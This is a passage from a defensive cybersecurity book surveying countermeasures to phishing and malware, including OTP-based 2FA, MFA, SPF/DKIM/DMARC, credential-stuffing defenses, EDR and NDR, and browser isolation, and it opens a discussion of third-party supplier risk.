responsible for authenticating the user. The encryption key is protected  by tamper-resistant hardware, similar to a security key—should anyone  attempt to tamper with the hardware, and get access to the key, the  hardware will self-destruct. Such destruction will not happen in a “Mission  Impossible” sense in which it will start smoking or explode, but rather  because the elements that make up the device are epoxied together,  including the key along with the processor that computes OTP codes.  Due to the epoxy, the components of the device break apart should an  adversary try to access the elements inside the device.  OTP codes allow the client to prove to the server that it knows a shared  key that is used to cryptographically generate an OTP code. The OTP code  differs each time but is based on the shared key. The general idea is shown  in the sequence diagram in Figure 12-4.  280   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  Figure 12-4.  How two-factor, OTP verification works  To set up an OTP device, the user registers with the server, and a   username, password, and a shared key are agreed upon. Once the user is  registered, a user can log in with the two factors. First, the server requests   and the user supplies  a username and password, the first factor. The  username and password are verified by the server, and if they are deemed  authentic, the server then checks a second factor, the OTP code which can  be generated only by the dedicated OTP device.  For readers who are interested in a bit more technical depth, there   are generally two types of algorithms that are used to generate OTP  codes based on a shared key—HOTP and TOTP. Both the HOTP and  TOTP algorithms generate the OTP codes and seem similar from a user  experience perspective—the user just enters the six-to-eight-digit code  displayed on the secure hardware token. Behind the curtain, HOTP, an  HMAC-based OTP algorithm, based on Internet RFC 4226, or TOTP,  a time-based OTP algorithm, based on Internet RFC 6238, is used to  generate OTP codes from the shared key. HOTP maintains a “counter”   281   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  to generate the first, second, third, and so on OTP codes. TOTP, by  comparison, does not use an explicit shared counter in addition to  a shared key, but rather relies on synchronized clocks on the user’s  dedicated hardware device, and the server.  As many usernames and passwords have been stolen in past breaches  and are available for purchase on the dark web  or some users may simply  choose easy-to-crack passwords, an issue going back to the late 1970s9 ,  checking the second-factor OTP code manages risk even if the first factor  has been stolen or cracked. Even if an attacker has remotely stolen or  cracked a username and password, the hope is that the attacker has not  also physically acquired the dedicated hardware token that generates  the OTP codes, although the latter may indeed happen in advanced,  sophisticated attacks.   Mobile App 2FA Authenticator  As mobile devices and smartphones that can run arbitrary software  applications have grown immensely in popularity, it is only reasonable  to take advantage of the computation power on such devices to generate  OTP codes instead of requiring the user to carry around a separate,  dedicated hardware device. Such mobile applications carry out the same  computations that a dedicated hardware device does, often using HOTP  or TOTP. Google Authenticator, Duo Mobile Security  acquired by Cisco ,  Microsoft Authenticator, and Symantec VIP  acquired by Broadcom  are all  examples of 2FA mobile authenticator apps.  Some authenticator apps provide for functionality that allows users   to simply “approve” a login, upon receiving a mobile push request to  authenticate. Underneath the covers, such apps provide the six- or eight- digit authentication code to the server behind the scenes, making logging  in more convenient to users. However, in highly sensitive environments,   9 Robert Morris and Ken Thompson, Password Security: A Case History  1979 .  282   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  when an attacker acquires a username and password, they can also  socially engineer a user to click “approve” even when they don’t intend to  log in, potentially giving the attacker access to a logged-in account. Users  are often “click happy” and will click anything that gets in the way of use  of their mobile phone. Once the user clicks “approve” to get the annoying  notification dialog box out of the way, the user can then get back to  checking their posts on Facebook. The attacker gets logged in as the user,  gaining a foothold on a user’s account.  Hence, in highly sensitive environments, it may be worthwhile to   require employees to actually type in codes from authenticator applications  one digit at a time instead of clicking to approve second-factor push  notifications.   SMS-Based OTP  In the case that the user does not have an authenticator application  installed on their smartphone, has not configured such an application  to work with a particular online site, or does not have a smartphone  altogether, a server can send the two-factor code to the user’s mobile  phone via SMS, the short message service that was built into the SS7   Signaling System 7  protocol engineered by telecommunication carriers in  the mid-1970s. Unfortunately, SMS is not encrypted and can be susceptible  to man-in-the-middle attacks. For instance, if a user unwittingly downloads  malware onto their phone, the malware may be able to read all SMS  messages and all two-factor codes sent to the phone. In addition, if an  attacker is able to compromise a short message servicing center  SMSC , a  component in a wireless telecommunications network, then the attack may  be able to access all two-factor codes that flow through the SMSC.  Even worse, services that rely on SMS-based OTP codes have been very   susceptible to SIM-swapping attacks. SIM stands for subscriber identity  module, and SIM cards are used in many mobile phones. A SIM card is  a tamper-resistant piece of hardware that has a private key embedded in   283   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  it that is associated with the user of the phone. When a mobile phone is  powered on, it authenticates itself to the mobile network based on the  private key embedded in the SIM card.  In one example of a SIM-swapping attack, the attacker calls up the   customer service department of a wireless carrier and convinces the  carrier to port your phone number to be associated with a SIM card that  the attacker owns. Given some basic information  one’s name, phone  number, address, etc. , attackers can socially engineer customer service  agents at wireless carriers to take control over your phone number. All 2FA  codes sent via SMS will then be sent to the attacker’s phone. Attackers can  then use their mobile device to answer the second-factor OTP challenges  associated with any of the legitimate user’s accounts, hence defeating  SMS-based 2FA authentication that can often be used by financial  institutions and other online services.   Email-Based OTP  A final method of two-factor authentication to log in to a sensitive or  corporate site is to send a second-factor code to a user’s email address  instead of via SMS. If the user can prove that they can log in to their email  address on file and access the OTP code sent to the email address, they will  be allowed to log in. Of course, if an attacker can compromise the user’s  email address, as occurred in the Yahoo breach, then the attacker will also  be able to steal any two-factor codes that are sent to the email address.   Multi-factor Authentication  MFA  Multi-factor authentication refers to using more than one factor  for authentication. Two-factor authentication is multi-factor  authentication. However, more than two factors can be used in multi-  factor authentication, and beyond two-factor authentication, we  encourage organizations to incorporate additional factors as a part of   284   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  their authentication processes. There is, in fact, a plethora of options,  and the sky is the limit for additional factors that can be included in an  authentication decision. The following are just some examples:     Device type and device configuration characteristics     User location     User application behavior  e.g., has the user accessed   an application before, and how frequently?      User characteristics  e.g., user gait as measured by   mobile phone, keystroke typing habits      Thumbprint  e.g., TouchID      Facial recognition  e.g., FaceID      Nature of account or transaction type  e.g., require   more factors and or higher authentication confidence  for more sensitive account or transaction types   Even if an attacker is able to steal a user’s username and password   credentials, and is also able compromise a second-factor OTP code  e.g.,  via a SIM-swapping attack or other means , the hope is that one or more  of the additional factors earlier will reveal that it is not the legitimate user  attempting to log in. For instance, if a SIM-swapping attack takes place,  and the attacker does not use exactly the same type of mobile phone  that the user previously had, then by incorporating characteristics about  the device as part of the authentication check, the attacker’s attempted  login could be blocked. Even if the attacker uses the exact type of device,  then by incorporating device configuration characteristics, such as what  applications have been installed, what version of those applications, or even  obscure characteristics of a device’s configuration  which storage sector an  uncommon application might be installed , the fact that an attacker is using  a device that is different than the user’s bona fide device can be revealed.  285   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  Multi-factor authentication can be static, looking at the same factors   all the time to produce a “yes” or “no” decision as to whether or not a user  should be considered authentic. Alternatively, multi-factor authentication  can be dynamic, or adaptive, in which case the same or different factors can  be used to make a probabilistic determination  e.g., it is 99% likely that the  user attempting to log in is the legitimate user , weighting different factors  based on context, time, or location, instead of a binary one  yes or no .   Phishing-Proof Your Domain s  with SPF, DKIM,  and DMARC When banks started offering services to consumers online, some of the  most popular phishing attacks involved sending emails claiming to be  from the bank to consumers, asking them to click a link in the email to  log in to their bank’s website. The email could be sent from the bank’s  domain in the “From:” header of the email  e.g., “From: Customer Support   ”  as the sender is not authenticated as part of  SMTP. Users receiving such phishing emails are more likely to believe an  email is being sent from the bank when the domain  bank.com in this  example  can be so easily “spoofed.”  Although leveraging person-to-person digital signatures to   authenticate both the senders and receivers of emails has remained elusive  for decades,10 there are a few protocols that have been developed over  time to make it harder to impersonate emails coming from organizations  that choose to leverage such protocols. Namely, to prevent a phisher from  sending an illegitimate email claiming to be from your organization, your   10 Issues range from usability of systems such as PGP  Pretty Good Privacy , as well   as integration of such capabilities into common email programs and sites.  286   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  organization should use the SPF, DKIM, and DMARC standards deployed  on the Internet. We now describe the very basics of each of these protocols. The first such protocol is SPF  Sender Policy Framework  which allows  organizations to specify which IP addresses are authorized to send emails  on the organization’s behalf. The list of authorized IP addresses can be  added to the organization’s DNS, domain name service, records. DNS  records are typically used to translate domain names  e.g., bank.com  to IP  addresses when, say, a web browser would like to connect to a web server.  With SPF, when an email program receives an email, it can look up   what is the authorized IP address11 corresponding to the domain and  compare whether or not the actual IP address from which the message  was sent is the same as the IP address listed in its DNS record. If it is, the  email is considered to be authentically sent from the organization. If not,  the email can be labeled as spam or deleted. The Domain-based Message  Authentication, Reporting, and Conformance  DMARC , standard can be  used to specify what an email program should do if the IP address does not  match. Similar to SPF, DMARC records can also be added to DNS, and the  options are as follows:    1.  None: Deliver the email anyway.    2.  Quarantine: Put the email in a spam folder.    3.  Reject: Delete the email out of the user’s inbox.  Finally, instead of just authenticating emails based on the IP address,  the DKIM  DomainKeys Identified Mail  protocol can be used to digitally  sign every legitimate message originating from an organization. DKIM uses  public-key cryptography12 to sign email messages. The email messages   11 SPF also allows one to specify what sending domains are authorized, instead of   just IP addresses, but we use IP address here to simplify the explanation.  12 See Chapter 13 of Foundations of Security for an introduction to public-key   cryptography.  287   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  are signed using a private key known only to the organization. The  corresponding public key is published in an organization’s DNS records,  and email programs can check the digital signatures on emails signed with  DKIM using the public key.  Ideally, DMARC records should specify that 100% of all emails for   which there is not an authentic match of a DKIM signature, or a SPF  check, should be rejected deleted. DMARC does provide the capability to  incrementally deploy these checks  from 0 to 100% , as large organizations  may have many third parties that send emails on their behalf. Each of  those third parties may need to be provided with a private DKIM signing  key and declared in SPF records.  Unfortunately, at the time of writing of this book, a majority of   companies do not have any DMARC policies set as part of their DNS  records.13 Even worse, only a small, single-digit percentage minority have a  DMARC reject policy in place, and very, very few have a 100% reject policy  for emails that do not pass SPF and DKIM checks.   Look-Alike Domains Fully implementing SPF, DKIM, and DMARC will make it difficult for  attackers to spoof emails coming from your organization’s legitimate  domain or domains. However, attackers can still forge emails from “look-  alike” domains. For instance, in the Anthem breach in 2015, the attacker  used “we11point.com” instead of “wellpoint.com.”  WellPoint was  acquired by Anthem in 2003.   To craft the most convincing phishing email possible, one could   imagine that an attacker might want such an email to appear to be from   13 Agari DMARC Report: 85% of Fortune 500 Leave Their Customers Vulnerable   to Impersonation Scams, www.agari.com email-security-blog  dmarc-q1-2020-email-fraud-report   288   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  wellpoint.com. However, if SPF, DKIM, and DMARC are employed,  then an attacker may have to resort to using a look-alike domain such  as we11point.com. Rendered in certain email readers, we11point.com  may look close enough to wellpoint.com that the difference may not  be perceivable at a quick glance. In addition, attackers can leverage  various international character sets  e.g., Cyrillic via Punycode  to  register look-alike domains that have characters that are extremely  similar  homographs  to the corresponding English characters to make  the difference look even less perceivable or nearly identical. Finally, an  attacker can even create SPF, DKIM, and DMARC records for the look-alike  domains to improve the “deliverability” of their attack emails. Some email  programs and Internet service providers may mark some phishing emails  as spam, but they can appear more legitimate if the attacker uses SPF,  DKIM, and DMARC for their look-alike domains.  In addition to protecting your legitimate domain s  from being   spoofed, it is important to  1  proactively register as many look-alikes  and misspellings of your organization’s domains as possible, and  2   have monitoring in place to determine if and when attackers register for  ownership for domains that are similar to yours that you may not have  proactively registered. As there can be an infinite number of variations,  given both international character sets and an explosion of top-level  domains  .co, .us, .ai, .vc, etc. , brand and domain monitoring services can  be used to help in detecting malicious domain registrations.  Finally, to help employees identify when emails are not being sent by   legitimate, internal parties, many organizations mark emails “external,” either  by inserting a “[EXT]” or “[EXTERNAL]” in a subject line, and or marking  the email “EXTERNAL” in the body of the message. Such markings can be  implemented in a variety of ways, one of which is to mark any message that  does not have a valid DKIM signature by the organization itself as external.  289    teChnology Defenses to fight the root Causes of BreaCh: part one  Chapter 12   Credential Stuffing and Account Takeover The goal of a phisher is often to acquire valid usernames and password  credentials. Once a phisher acquires a username and password, they can  effectively attempt to take over the user’s account. Attackers can purchase  large numbers of stolen usernames and passwords from the dark web.  Even if those stolen usernames and passwords are not for your site or  organization, users unfortunately tend to reuse the same passwords across  sites, and their stolen passwords from the many thousands of breaches  that have already taken place  including the mega-breaches covered in the  first part of this book  can work on your systems.  When attackers test large numbers of stolen username and password   credentials against target sites, such activity is referred to as credential  stuffing. To protect against credential stuffing, there are two key defenses  that need to be deployed:  1  anti-bot detection and  2  checking for  employee use of already stolen passwords.  Anti-bot detection identifies attacker’s automated attempts at trying   stolen username and password combinations on your site. Companies  such as Imperva, Shape Security  acquired by F5 , Akamai, and Cloudflare  have anti-bot detection and mitigation offerings that not only help  detect credential stuffing attack attempts on your site, but can also help  address content scraping, carding  in which attackers try stolen credit  card numbers against your site to determine if they are still valid , and  account takeover  in the case that their credential stuffing attempt yields a  successful login on your site .  As employees may reuse the same passwords on your corporate   network as they have used on their personal online accounts, it is  important that you identify when that is the case, and have them change  their corporate passwords. Attackers will inevitably test stolen credentials  from previous breaches that they obtain from the dark web against your  corporate network. All that attackers need to find is one employee who  reused such a password to take over one account on your corporate   290   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  network, get access to their corporate email  also termed “business email  compromise” , and then attempt to grow their footprint in your network  using all the knowledge in the inbox of the compromised employee.  To identify such cases of password reuse, you need to check all of your  employee’s passwords against password dumps from the dark web. Shape  Security, 4IQ, and the HaveIBeenPwned service can help. In addition  to doing a check of all your employee’s passwords in bulk if that is not  something you have already done, it is also important that every time  that an employee changes their password, the new candidate password is  checked against repositories of stolen passwords.   Password Managers Password managers are applications that employees can use to  automatically generate and manage strong, complex passwords that  are unique to each site they use. Some password managers also feature  integration with browsers such that the password manager can help verify  that a site is the legitimate, bona fide site before submitting a password  to it. When a password manager first generates a password for a site at  registration time, it can also record what is the domain of the legitimate  site. If at a later point, the user clicks a link to an impostor site, the impostor  site will not match the legitimate domain, and the password manager can  advise the user not to submit their credentials. The check that the password  manager conducts is a technical byte-by-byte check, and it will not be fooled  by look-alike domains. Some examples of password managers on the market  at the time of writing of this book are 1Password, Dashlane, and LastPass.  We discuss password managers in this section only after 2FA,  credential stuffing checks, and the other defenses earlier because  password managers require consistent use by an employee for each and  every online site if they are to work as a defense. By comparison, whenever  technology and processes can be put in place that systematically do the  right thing each time instead of leaving things to user choice and habit,   291   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  one is more likely to consistently achieve secure outcomes. Defenders have  to get it right each and every time. Attackers have to be successful only  once to make an initial compromise.   Additional Phishing Defenses Although this chapter primarily focuses on technology-oriented defenses  and countermeasures for root causes of breach, as opposed to focusing on  processes and people, we briefly comment on three process and people-  oriented phishing defenses:  1  anti-phishing training and testing,  2   password complexity checks, and  3  password rotation.   Anti-phishing Training and Testing  Anti-phishing training is employee training in which employees are taught  about the common signs to look for in emails that may indicate they are  phishing or spear phishing attacks. Some examples of such signs are  unfamiliar or incorrect domains used in the From header or in links in an  email, unexpected attachments, or calls to action that include an artificial  sense of urgency  e.g., “you need to respond right away otherwise your  account will be deactivated” .  Such training is typically followed up by phishing tests sent by the   organization’s security team.  The security team should, of course, also  send phishing tests prior to the training as well to baseline.  The phishing  tests are crafted to appear to be just like phishing emails from attackers  except they are benign, and their goal is to see if employees can avoid  falling for them. If an employee opens a test phishing email, clicks a link  in the email, clicks an attachment to the email, or enters their credentials  into an impostor site linked to in the email, a teachable moment results  in which the employee is made aware that they fell susceptible to the  test phishing attack. If an employee doesn’t fall for the attack, but rather  reports the email to the organization’s security team, that is a sign of   292   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  success that anti- phishing training is working, and the employee may  be less susceptible to a phishing attack than they were prior to the anti- phishing training. Even better is when employees start to report phishing  emails to the security team that were not phishing tests saying “Haha  security team – you tried to phish me, but I figured out it was you!” The  security team responds, “Actually, that wasn’t us! Thanks for letting us  know about this real attack that our automated defenses did not catch!”  With enough training, employees can be turned into human sensors that  are a last line of defense in detecting phishing attacks that have not been  filtered out of an employee’s inbox via all other countermeasures.  Security teams often send out test phishing attacks both before and  after anti-phishing training campaigns to determine the impact of anti-  phishing training. Of course, doing such comparisons after just one anti-  phishing training campaign can be a challenge as no two phishing tests  are exactly alike and results may need to be calibrated based on level of  deceptiveness. At the same time, by conducting anti-phishing training at  least annually, and issuing phishing tests periodically  once per quarter,  once per month, or once per week , one should be able to measure  whether or not employees are actually becoming less susceptible to  phishing attacks over time.  Note that if an organization employs security keys as a defense,   phishing training and testing may not be necessary because security keys  are so highly effective at defending against phishing. However, with various  forms of 2FA based on authenticator apps that allow for one-click accept  logins that can be socially engineered, some amount of anti-phishing  training for employees can still be useful.  293   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one   Password Complexity Checks  Some systems require that employees choose passwords that satisfy a set  of complexity constraints, such as the password must:     Be more than X characters in length  for some   reasonable value of X   Include both letters and numbers  Include both capital and lowercase letters  Include a special symbol  *, !, , etc.               Such password complexity checks can help avoid users choosing   frequently used but braindead passwords such as “123456” or “password”.  However, password complexity checks are never sufficient on their own.  Given the number of combinations that a modern microprocessor can try  in a fairly short amount of time, it is relatively straightforward to “brute-  force” passwords  try every possible combination . If an attacker can  steal a database of hashed passwords  see the discussion in Chapter 7 on  the Yahoo breach , every possible combination of even reasonably sized  passwords along with salts can be hashed by attackers offline to discover  matches of a fraction of all the hashed passwords in the database. In the  case that an attacker has not stolen a hashed password database, and  only has online access to a system to try a brute-force attack, password  complexity checks can prevent only the most basic such brute-force attack  if no anti-bot countermeasures are in place.  Password complexity checks are not recommended by NIST  National   Institute of Standards and Technology  800-63 guidelines as they lead  to poor password behavior in the long run. Although they are relatively  low cost and low complexity to implement, their effectiveness against  warding off most sophisticated attacks is also relatively low, and we do not  recommend using password complexity checks, or at the very least that  they be used in tandem with other defenses described in this chapter.  294   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one   Password Rotation  Some systems require users to change their password periodically. For  instance, in some companies, employees are required to change their  passwords once every 90 days. Employees typically find such policies a  nuisance, and they are typically not very effective, as employees choose  similar passwords to their previous ones, or cycle through them. NIST 800-  63 guidance also recommends against using password rotation as it leads  to poor password behavior over the long run.  Now that we have surveyed a variety of anti-phishing defenses, we now   move on to malware defenses.   Malware Defenses Although malicious software can probably always be created as long as  software exists, that does not mean that we cannot prevent it from running,  detect its existence, and neutralize it. Even though miscreants may always  be able to create new malware, if we can prevent it from running, detect  it, and neutralize it, we can effectively eradicate malware from doing  anything of interest to the attacker.  Malware is often named or categorized based on what it does or how it  spreads. Ransomware, for instance, is termed as such based on what they  do in that they encrypt data with an encryption key unknown to the system  owner, rendering systems that need to use that data useless, and do not  provide the system owner a decryption key unless the malware author or  operator are paid a ransom. Viruses, by comparison, are named as such  based on how they spread in that they are malware that can replicate  themselves with the assistance of a human operator—for example,  inserting an infected USB stick  or inserting an infected floppy disk in a  computer decades ago . Worms are viruses that can replicate themselves   295   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  from one host to another over a computer network without the assistance  of a human.  WannaCry is an example of ransomware that surfaced in 2017 as a   worm that infected over 200,000 machines. So, if we thought that we were  faring better as an industry than we were since the early 2000s, in the days  of Code Red, Nimda, and SQL Slammer worms, we had better take a dose  of humility. Worms are unfortunately still around and capable of wreaking  havoc.  Sophisticated ransomware can also encrypt and or delete backups.  In addition to running strong anti-malware defenses, companies should  actually test that they can retrieve data from their backups once they  have a backup system set up so that the first time that they are recovering  from a ransomware attack is not the first time they are testing recovering  from backups. Many companies set up a backup system, but then don’t  test it regularly and are not able to recover from backup when needed.  Sophisticated ransomware can also exfiltrate data to the attacker’s server,  and delete it locally, resulting in a breach and forcing an organization to  pay ransom in order to get their data back.  Malware has also been a root cause in many data breaches covered in  this book, including the Office of Personnel Management  OPM  breach   of 2015, the Yahoo breaches announced in 2016, and the Marriott breach  of 2018.   Anti-malware So why is it that even 50 years after the first computer virus was developed,  there have been data breaches in which malware can go undetected  for so long in some of the biggest breaches in history? The answer lies  in part in that organizations have not deployed sufficient anti-malware  defense, and the defenses that may have been deployed were based on a  signature-based detection model—in order to detect that a file is malware,   296   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  a signature or a distinctive sequence of bytes known to be used in the  malware must be present.  Today’s organized criminal and nation-state attackers don’t just   develop malware and release it in the hopes that it will help them  accomplish their goals. Rather, they generate many variants of malware  and run the malware though all the detection scanners that the target  organization might employ. Once they have developed malware variants  that are different enough, and do not have a known signature that can be  detected by the scanners used by target organizations, only then do they  deploy their malware. As such, the malware can infect and do its business  without being detected at all, at least for a few days, weeks, or months, if  not longer. The SolarWinds hack announced in December 2020 was, for  instance, in part to due malware being injected into a trusted software  update, and was undiscovered for many months.  The signature-based detection model in the anti-virus world has been   obsolete for quite some time, and detection techniques that leverage newer  approaches such as artificial intelligence are absolutely required if there  is to be any hope at detecting modern-day malware released by attackers  that can test their malware against all known detection scanners. Hence,  we recommend leveraging anti-malware products that use a combination  of artificial intelligence and threat intelligence to detect sophisticated  malware, and signatures to detect only the most basic malware.  In addition, as anti-malware detection can be constrained by the   local resources of the device  memory, CPU, etc. , anti-malware products  that leverage cloud resources are likely to be more effective than those  that just attempt to use the local resources of the device for detection.  For instance, if a file seems suspicious as per some basic AI analysis on  the local machine but does not match any local signatures or exhibit any  actual malicious behavior, the signature of the file and or the suspicious  file itself can be sent to the anti-malware vendor’s server in the cloud for  further checking and analysis. The analysis that can be conducted at the   297   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  anti-malware vendor’s data center in the cloud can be done in much more  depth than analysis that can be conducted on the local device itself.  Anti-malware products are often called endpoint protection  EP  and  have additional features such as safe browsing protections. For instance, if  a user browses to a URL or domain that is known to serve malware or may  be a phishing site, then the EP software can block access to the site even  before malware has the opportunity to make its way to the user’s machine.   Endpoint Detection and Response  EDR  In addition to anti-malware defenses running on endpoints, endpoint  detection and response  EDR  software has grown in popularity over the  years. EDR provides visibility to security teams as to system activities   and events that can help uncover security incidents, aside from direct   anti- malware detection capability itself. EDR products provide security  teams with many capabilities—the following are some examples:     Search for indicators of compromise  IOCs  or   indicators of attack  IOAs      Determine all active processes that are running on the   endpoint     Determine all network connections between the   endpoint and internal or external machines     Access history of all accounts that logged in to the   endpoint over time      Identify creation of encrypted archives  RAR or ZIP  files  that an attacker may use or have used to exfiltrate  stolen data  CrowdStrike and Carbon Black are examples of well-known EDR   products.  298    teChnology Defenses to fight the root Causes of BreaCh: part one  Chapter 12   Network Detection and Response  NDR  The downside, however, of endpoint-oriented defenses for malware is  that it is the equivalent of looking for poisoned water just before it comes  out of a spout—whether that spout be the kitchen sink, bathroom sink,  or a shower. Alternatively, it might be better if the bad or poisoned water  can be detected as it is flowing through the pipes and before it hits an  endpoint. As such, embedding anti-malware defense in the network  and inspecting code and data as it is flowing through the network can  identify and block malware even before it gets to an endpoint. A category  of security tools called network detection and response  NDR  provides  both malware detection and detection of many other types of suspicious  traffic. Blue Hexagon, Cisco StealthWatch, and ExtraHop are examples of  NDR offerings. Key metrics that can be used to evaluate the effectiveness  of NDR solutions include mean time to detect  MTTD , zero-day detection  rate, false positive rate, alerts-to-incidents ratio, and false negative rate.14  Independent third-party testing and certification companies can evaluate  such offerings against such effectiveness metrics. Miercom’s report on Blue  Hexagon is one such example.15  We also summarize some of the trade-offs  pluses and minuses  of   EDR and NDR solutions in Table 12-2.  14 N. Daswani, Network Detection and Response: A CSO Manifesto. 15 Blue Hexagon Next-Gen Network Detection and Response Security Performance   Assessment, https:  bluehexagon.ai miercom-report   299   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  Table 12-2.

Finally, even with network detection of malware, there may never be   any detection capability that is 100% accurate.   Remote Browser Isolation  RBI  Leveraging technologies that can isolate malware from ever being  transmitted to an organization’s network and ever reaching an endpoint  can be extremely useful. Remote browser isolation  RBI  technology  takes advantage of the insight that the everyday web browser is typically  responsible for the bulk of transmission of malware. Many users read their  email in a web browser and spend a bulk of their time online using the  web browser. Email attachments that are malware often are downloaded  via a web browser. Web pages that are viewed that have been infected  with a malware drive-by-download, either directly, through a third-  party widget on the web page, or via an ad on the web page, can result in  malware getting downloaded to the user’s machine via the web browser.  The many plug-ins that web browsers use to render content—PDF readers,   300   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  Flash, Applets, and so on—all have software vulnerabilities that can be  used to send malware to a user through the browser. Although one can  potentially disable relatively dangerous browser plug-ins such as Flash  and Java, which have been particularly susceptible to zero-day attacks,  on all endpoints, it is more secure to control browser configuration and  third-party plug-ins on a cloud server and allow endpoints to only see and  interact with the display.  Remote browser isolation technology “air-gaps” the browser by   running the browser on a server and only sending display pixels to the  user’s endpoint device. Users can interact with the web page and the  display pixels just as if the browser on their endpoint was rendering the  content, but the danger in rendering the content and leveraging any third-  party plugs-ins that the browser uses to do so is farmed out to a hardened  server in the cloud.  One might expect that there may be some slight additional latency   that is incurred due to the actual rendering not taking place on the user’s  endpoint, but leading remote browser isolation companies such as  Cyberinc have minimized such latency. The other potential challenge with  remote browser isolation is the extra network bandwidth and resulting  cost as all the data bits of web content must be downloaded first to a cloud  server, and then the display pixels must then be sent to the endpoint.  Caching can be used to fetch content once and provide it multiple times to  endpoints that request that particular content to minimize any potential  extra network bandwidth costs.   Virtual Desktop Interface  VDI  For employees who do not need access to local applications on their  endpoints, leveraging a virtual desktop interface  VDI  is an approach  in which not only is the browser “air-gapped” but so are all desktop  applications and data used by those applications. All applications and all  data reside on a server in the cloud and only display pixels are sent to the   301   Chapter 12    teChnology Defenses to fight the root Causes of BreaCh: part one  endpoint. VDI can help prevent malware infections as, similar to RBI, web  browsing does not take place on the actual endpoint itself, but only on a  hardened and much better protected server in the cloud. However, VDI  is more complex to deploy than RBI as all applications on a desktop are  virtualized instead of just the browser.   Summary In this chapter, we have covered dozens of technologies that can be  employed to address phishing and malware.  The strongest defense against phishing is to use security keys, but   they may involve more cost and deployment complexity than other 2FA  solutions. Mobile authenticator applications are a great low-cost and  complexity 2FA solution. Defending against credential stuffing via anti-bot  technology and checking passwords in use against dark web repositories  can additionally protect the first factor used in authentication.  Defending against malware requires a combination of endpoint   protection, endpoint detection and response, and network detection and  response. An endpoint protection suite that leverages artificial intelligence  and the power of the cloud is extremely desirable. EDR provides security  teams the tools they need to detect APTs that may get past EP and conduct  forensic analysis as needed. NDR can be used to intercept malware that  flows over a network before it even gets to an endpoint as well as detect  other forms of suspicious behavior observable on an organization’s  network. Remote browser isolation  RBI  and virtual desktop interfaces   VDI  can drastically reduce the endpoint attack surface from being  affected by malware.  In our next chapter, we continue our coverage of technology defenses  to cover third-party risk, software vulnerabilities, unencrypted data, and  inadvertent employee mistakes.  302   CHAPTER 13  Technology Defenses  to Fight the Root  Causes of Breach:  Part Two  In this chapter, we continue our discussion of technology defenses and  cover fighting third-party risk, software vulnerabilities, unencrypted data,  and inadvertent employee mistakes.   Mitigating Third-Party Risk As we have seen in the first part of this book, many data breaches start  with compromises at third parties. Virtually no organization can operate  as an island, and virtually every organization relies on a number of third  parties—sometimes a few, sometimes a dozen, sometimes hundreds,  and sometimes thousands. Third parties can be suppliers, partners, or  potential acquirees, and generally the larger the organization, the more  third parties upon which it may rely. As an example, in January 2021 as  we are finalizing this book, we are learning daily of the impact on many  government, cybersecurity, and other organizations from the SolarWinds  hack, arguably one of the most sophisticated third-party supply-chain     Neil Daswani and Moudy Elbayadi 2021  N. Daswani and M. Elbayadi, Big Breaches, https:  doi.org 10.1007 978-1-4842-6655-7_13  303   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  hacks to-date. Approximately 18,000 organizations that have used  SolarWinds as a third-party may have been impacted and the reader is  encouraged to download our free chapter on the SolarWinds hack from the  book’s website at www.bigbreaches.com.  In other examples, Target was initially compromised due to Fazio  Mechanical Services, its HVAC supplier. JPMorgan Chase was initially  compromised due to Simmco Data Systems, a supplier that managed its  charitable marathon race websites. In Facebook’s case, Cambridge Analytica  abused their services to acquire and use profile data inappropriately. In  the case of Marriott, a breach occurred because Starwood, a third-party  company that they acquired, had been breached prior to their acquisition  of the company. In this section, we will cover what CISOs can do to mitigate  risks due to the various types of third parties.  If a third-party that is given data or network access is not secure,   neither is your organization. If a third party is not compliant, it can affect  your compliance. Every third party can become the weakest link.  Although an entire book could probably be written on the topic of   third-party risk  as is also the case with many of the other root causes of  breach , we provide a basic overview of key things to consider in securely  working with different types of third parties.   Supplier Security The most common type of third party can often be a supplier. To assess  and manage a risk due to third-party suppliers, the first step is to take  inventory of all third-party supplier relationships. Depending upon  what is procured from them, and the nature of the relationship, one  may have to vet their security at the time the initial contract is created,  and periodically thereafter. If your organization is buying pencils from  a third-party, probably little or no vetting is required. If the service  procured is something more significant, not only might initial vetting  be required, but periodic audits may be required. For instance, if any of   304   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  your customer PII is shared with a supplier, then a breach of that supplier  can mean an almost immediate breach of your organization, as all eyes  can be on your organization as the data source. Suppliers that provide  information technology services are also often a high priority for vetting. If your organization has a head of procurement, getting to know them   would be an ideal first step. That said, one should always keep in mind that  the procurement department may not have a full inventory of all suppliers,  as the world is not perfect and the procurement organization may also be  working hard to centralize all company purchases. On the other hand, if  your organization does not have a procurement department, you may have  quite a battle ahead and more risk due to unmanaged third-party suppliers  than you want! In such a case, it would probably be a good idea to educate  managers as part of security awareness training that they should run new  supplier relationships or renewal of them by the security team until a  procurement department is set up, and new suppliers have to go through  proper procurement processes  including a security review .  Whether or not your organization has a procurement department,   “shadow IT,” in which employees or departments in your organization may  directly procure IT services or products and do not go through a central IT  department, can be a particular cause for concern. For instance, if software  engineers sign up to purchase cloud computing or SaaS services with their  corporate or personal credit cards on behalf of the company, and do not  provide the procurement department visibility, it can be hard to manage  risk due to those services, including both financial and cybersecurity risk.  Although we focus on cybersecurity concerns here for the most part, if an  employee leaves the company, and the company is relying on a cloud or  SaaS service that is being paid for using a credit card that is invalidated  upon the employee’s departure, downtime, unavailability, or worse  e.g.,  data deletion  can result when that credit card does not get paid. Incidentally, many startup companies know that 